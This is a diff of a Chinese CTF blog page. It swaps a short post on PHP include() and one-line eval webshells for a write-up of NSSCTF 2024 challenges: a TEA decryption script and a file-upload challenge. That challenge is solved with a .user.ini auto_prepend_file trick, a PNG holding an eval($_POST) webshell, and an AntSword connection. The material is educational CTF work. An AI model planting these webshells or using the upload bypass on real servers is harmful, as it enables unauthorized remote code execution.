@@ -19,22 +19,36 @@
   <meta name="author" content="fogpost">
   <meta name="keywords" content="">
   
-    <meta name="description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
+    <meta name="description" content="nssctf2024秋季回顾前言这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了 reverseNSS茶馆这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下  先是查壳 老样子32位启动在这个图中的sub_411118便是我们的解密函数，判断函数tea本体解题脚本1234">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php一句话木马">
-<meta property="og:url" content="https://fogpost.top/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:title" content="nssctf2024秋季回顾">
+<meta property="og:url" content="https://fogpost.top/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
-<meta property="og:description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
+<meta property="og:description" content="nssctf2024秋季回顾前言这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了 reverseNSS茶馆这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下  先是查壳 老样子32位启动在这个图中的sub_411118便是我们的解密函数，判断函数tea本体解题脚本1234">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-09T02:52:03.000Z">
-<meta property="article:modified_time" content="2024-10-30T06:51:21.728Z">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410312022329.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410312040919.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410312046855.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410312047549.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410312118868.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011425977.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011439740.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011440878.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011442332.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011442165.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011454711.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011528057.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411011529825.png">
+<meta property="article:published_time" content="2024-10-31T12:18:03.000Z">
+<meta property="article:modified_time" content="2024-11-01T07:29:45.592Z">
 <meta property="article:author" content="fogpost">
-<meta property="article:tag" content="php">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/fogpost/photo/raw/master/202410312022329.png">
   
   
   
-  <title>php一句话木马 - fogpost`s little blog</title>
+  <title>nssctf2024秋季回顾 - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="php一句话木马"></span>
+            <span id="subtitle" data-typed-text="nssctf2024秋季回顾"></span>
           
         </div>
 
@@ -211,8 +225,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-09 10:52" pubdate>
-          2024年10月9日 上午
+        <time datetime="2024-10-31 20:18" pubdate>
+          2024年10月31日 晚上
         </time>
       </span>
     
@@ -223,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          221 字
+          624 字
         
       </span>
     
@@ -234,7 +248,7 @@
         
         
         
-          2 分钟
+          6 分钟
         
       </span>
     
@@ -271,21 +285,27 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">php一句话木马</h1>
+            <h1 id="seo-header">nssctf2024秋季回顾</h1>
             
             
               <div class="markdown-body">
                 
-                <p>了解一下php的include函数顺便了解一句话木马的各种形式</p>
-<h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><blockquote>
-<?php @eval($_POST['cmd']); ?>
-<?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包</p>
+                <h1 id="nssctf2024秋季回顾"><a href="#nssctf2024秋季回顾" class="headerlink" title="nssctf2024秋季回顾"></a>nssctf2024秋季回顾</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了</p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="NSS茶馆"><a href="#NSS茶馆" class="headerlink" title="NSS茶馆"></a>NSS茶馆</h3><p>这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下</p>
+<ul>
+<li>先是查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312022329.png" srcset="/img/loading.gif" lazyload></li>
+<li>老样子32位启动<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312040919.png" srcset="/img/loading.gif" lazyload><br>在这个图中的sub_411118便是我们的解密函数，判断函数<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312046855.png" srcset="/img/loading.gif" lazyload><br>tea本体<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312047549.png" srcset="/img/loading.gif" lazyload><br>解题脚本<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v,<span class="hljs-type">uint32_t</span> * k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">1131796</span>*<span class="hljs-number">33</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">1131796</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">33</span>; i++)&#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        sum -=delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint32_t</span> values[<span class="hljs-number">2</span>];<br>&#125; Data;<br><br><span class="hljs-comment">// unsigned char enc[] =</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//   0x65, 0xD2, 0x26, 0x3A, 0xB6, 0xA0, 0xD9, 0x81, 0x2A, 0x00, </span><br><span class="hljs-comment">//   0x5E, 0x0E, 0xE5, 0xEF, 0x07, 0x39, 0x57, 0xBC, 0xB6, 0x71, </span><br><span class="hljs-comment">//   0xA2, 0x0D, 0xAC, 0xE0</span><br><span class="hljs-comment">// &#125;;</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    Data v[<span class="hljs-number">3</span>]=&#123;&#123;<span class="hljs-number">0x3A26D265</span>,<span class="hljs-number">0x81D9A0B6</span>&#125;,&#123;<span class="hljs-number">0x0E5E002A</span>,<span class="hljs-number">0x3907EFE5</span>&#125;,&#123;<span class="hljs-number">0x71B6BC57</span>,<span class="hljs-number">0xE0AC0DA2</span>&#125;&#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0x0B</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2C</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">decrypt</span>(v[i].values,k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;decrtp:%x %x\n&quot;</span>,v[i].values[<span class="hljs-number">0</span>],v[i].values[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+结果是这个<br>decrtp:4e535343 54467b74<br>decrtp:65615f69 735f736f<br>decrtp:5f656173 7921217d<br>直接就是hex转chr了<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312118868.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{tea_is_so_easy!!}</li>
+</ul>
+<h3 id="MD5爆破"><a href="#MD5爆破" class="headerlink" title="MD5爆破"></a>MD5爆破</h3><p>纯手撸，题解也看不懂，脚本都跑不动</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>开头就是一个文件上传页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011425977.png" srcset="/img/loading.gif" lazyload><br>我们选择一个文件直接上传，png可以上传，对php有过滤<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011439740.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011440878.png" srcset="/img/loading.gif" lazyload><br>然后我们尝试抓包并修改数据，可以成功上传，尝试访问<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442332.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442165.png" srcset="/img/loading.gif" lazyload><br>其中也尝试了其他的后缀，不过可以上传但是不可以解析，按照别人的wp来看，好像是uploads目录下有一个notion.php文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011454711.png" srcset="/img/loading.gif" lazyload><br>尝试上传.user.ini</p>
+<blockquote>
+<p>.user.ini 是⼀个⽤户⾃定义的php.ini ⽂件，会在其所在的当前⽬录⽣效，优先级⾼于php.ini<br>在user.ini中写⼊以下内容<br>auto_prepend_file &#x3D; &lt;filename&gt;    &#x2F;&#x2F;包含在⽂件头<br>auto_append_file &#x3D; &lt;filename&gt;      &#x2F;&#x2F;包含在⽂件尾<br>写⼊其中⼀个即可<br>&lt;filename&gt;就写成需要包含的⽂件名，后缀任意上传后，该⽬录下的php⽂件就会⾃动包含&lt;filename&gt;<br>.user.ini</p>
 </blockquote>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = 外部文件包含.png<br><span class="hljs-attr">auto_append_file</span> = 外部文件包含.png <br></code></pre></td></tr></table></figure>
+<p>外部文件包含.png</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>利用蚁剑成功连接<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011528057.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011529825.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{11822be1-0c76-4bc8-9f67-82fcf3f3ec33}</p>
 
                 
               </div>
@@ -304,7 +324,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BD%91%E7%BB%9C/" class="category-chain-item">网络</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
   
 
@@ -319,7 +339,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/php/" class="print-no-link">#php</a>
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
       
     </div>
   
@@ -331,8 +351,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>php一句话木马</div>
-      <div>https://fogpost.top/2024/10/09/php一句话木马/</div>
+      <div>nssctf2024秋季回顾</div>
+      <div>https://fogpost.top/2024/10/31/nssctf2024秋季回顾/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +364,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月9日</div>
+          <div>2024年10月31日</div>
         </div>
       
       
@@ -376,9 +396,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/" title="wuai第八课">
+                      <a href="/2024/11/01/sicctfwp/" title="sicctfwp">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">wuai第八课</span>
+                        <span class="hidden-mobile">sicctfwp</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -386,8 +406,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/" title="sqli练习">
-                        <span class="hidden-mobile">sqli练习</span>
+                      <a href="/2024/10/31/goldeneye-v1/" title="goldeneye_v1">
+                        <span class="hidden-mobile">goldeneye_v1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
